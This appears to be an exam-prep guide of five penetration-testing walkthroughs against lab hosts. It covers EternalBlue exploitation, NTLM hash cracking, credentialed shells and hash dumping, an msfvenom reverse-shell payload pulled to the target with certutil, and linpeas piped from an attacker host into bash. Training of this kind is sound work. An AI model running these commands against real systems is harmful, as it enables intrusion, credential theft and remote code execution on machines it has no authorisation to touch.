# 05 System Hacking — full walkthroughs

End-to-end examples. These mirror how a real exam question flows.

---

## Walkthrough 1: "Exploit MS17-010 on 10.10.10.7 and read C:\Users\Administrator\Desktop\flag.txt"

**Type:** exploitation + post-ex | **Difficulty:** easy | **Time:** 3–5 min

1. Confirm the vuln (from [02-scanning](../02-scanning/README.md)):
   ```bash
   nmap -p 445 --script smb-vuln-ms17-010 10.10.10.7
   ```
2. Fire metasploit:
   ```bash
   msfconsole -q
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOSTS 10.10.10.7
   set LHOST <LHOST>
   run
   ```
3. You get a SYSTEM meterpreter. Grab the flag:
   ```
   meterpreter> cd C:\\Users\\Administrator\\Desktop
   meterpreter> cat flag.txt
   ```
4. **Answer:** copy the flag value verbatim.

**Gotcha:** if exploit fails, try `set target 2` or the auxiliary scanner first (`auxiliary/scanner/smb/smb_ms17_010`).

---

## Walkthrough 2: "Crack this NTLM hash and report the password"

**Type:** offline cracking | **Difficulty:** easy | **Time:** 1–3 min

Given: `aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c`

1. Save just the NT portion to a file:
   ```bash
   echo "8846f7eaee8fb117ad06bdd830b7586c" > hash.txt
   ```
2. Hashcat — mode **1000** for NTLM:
   ```bash
   hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
   ```
3. Show result:
   ```bash
   hashcat -m 1000 hash.txt --show
   ```
4. **Answer:** the plaintext after the colon (here: `password`).

**Backup:** john auto-detects:
```bash
john --format=NT --wordlist=rockyou.txt hash.txt
john --show hash.txt
```

---

## Walkthrough 3: "You have credentials bob:Summer2024. Get a shell on the Windows box 10.10.10.15 and dump all hashes."

**Type:** credentialed access + loot | **Difficulty:** medium | **Time:** 3–5 min

1. Validate the creds work anywhere with crackmapexec:
   ```bash
   crackmapexec smb 10.10.10.15 -u bob -p Summer2024
   ```
   Look for `[+]` — ideally `(Pwn3d!)` meaning local admin.
2. Pick a shell method:
   - If WinRM (5985) is open:
     ```bash
     evil-winrm -i 10.10.10.15 -u bob -p Summer2024
     ```
   - Otherwise psexec:
     ```bash
     impacket-psexec bob:Summer2024@10.10.10.15
     ```
3. Dump SAM + LSA + DCSync (if DC):
   ```bash
   impacket-secretsdump bob:Summer2024@10.10.10.15
   ```
4. **Answer:** the domain hashes list, or a specific user's hash the question asks for.

---

## Walkthrough 4: "Generate a Windows reverse shell, host it, and get a meterpreter session"

**Type:** payload delivery | **Difficulty:** medium | **Time:** 5 min

1. Build the payload:
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o shell.exe
   ```
2. Host it over HTTP:
   ```bash
   python3 -m http.server 80
   ```
3. Start the listener in another terminal:
   ```bash
   msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT 4444; run"
   ```
4. On the target (via any RCE), download + run:
   ```
   certutil -urlcache -f http://<LHOST>/shell.exe shell.exe
   shell.exe
   ```
5. Meterpreter opens. Run `getuid`, `sysinfo`, then `getsystem` to elevate.

**Next step:** if `getsystem` fails, drop [winpeas](../tools/winpeas.md) and hunt for a local privesc.

---

## Walkthrough 5: "You have a low-priv Linux shell on 10.10.10.30 — escalate to root"

**Type:** Linux privesc | **Difficulty:** medium | **Time:** 5–10 min

1. Quick manual checks first:
   ```bash
   id
   sudo -l
   uname -a
   find / -perm -4000 -type f 2>/dev/null
   ```
2. If `sudo -l` shows anything allowed → check [GTFOBins](https://gtfobins.github.io/).
3. If nothing obvious, run linpeas:
   ```bash
   # On attacker:
   python3 -m http.server 80
   # On target:
   curl http://<LHOST>/linpeas.sh | bash
   ```
4. Look for **red/yellow** highlights — SUID, writable /etc/passwd, cron jobs, kernel CVEs.
5. **Answer:** the root flag at `/root/flag.txt` (or whatever the question asks for).
